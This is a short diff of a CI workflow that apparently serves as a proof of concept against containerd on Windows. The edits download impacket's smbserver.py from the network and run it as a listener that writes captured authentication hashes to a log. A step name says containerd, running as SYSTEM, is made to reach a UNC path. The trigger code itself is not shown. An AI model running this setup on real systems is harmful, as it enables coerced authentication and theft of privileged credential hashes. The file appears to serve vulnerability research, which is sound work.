@@ -27,7 +27,7 @@ jobs:
           Write-Output "BUILD_STUB_EXIT=$LASTEXITCODE"
           python -m pip install --quiet impacket 2>&1 | Select-Object -Last 5
           Write-Output "PIP_EXIT=$LASTEXITCODE"
-          python -c "import impacket; print('IMACKET', impacket.__version__)" 2>&1
+          python -c "import impacket; print('IMPORT_OK', impacket.__file__)" 2>&1
 
       - name: Start SMB server + containerd(SYSTEM) + trigger UNC label + capture
         shell: pwsh
@@ -43,7 +43,8 @@ jobs:
           $unc = "\\$ip\SHARE"
           Write-Output "UNC_PATH=$unc"
           # start impacket SMB server (logs hashes to file)
-          $smbpy = python -c "import impacket,os;print(os.path.join(os.path.dirname(impacket.__file__),'..','examples','smbserver.py'))" 2>$null
+          $smbpy = "C:\ctdpoc\smbserver.py"
+          Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/fortra/impacket/master/examples/smbserver.py' -OutFile $smbpy -UseBasicParsing
           Write-Output "SMBPY=$smbpy"
           $pSmb = Start-Process -FilePath "python" -ArgumentList @($smbpy,'-smb2support','-debug','-ip','0.0.0.0','-outputfile','C:\ctdpoc\smb.log','SHARE','C:\ctdpoc\share') -RedirectStandardOutput "$base\smb_stdout.log" -RedirectStandardError "$base\smb_stderr.log" -PassThru
           Write-Output "SMB_PID=$($pSmb.Id)"
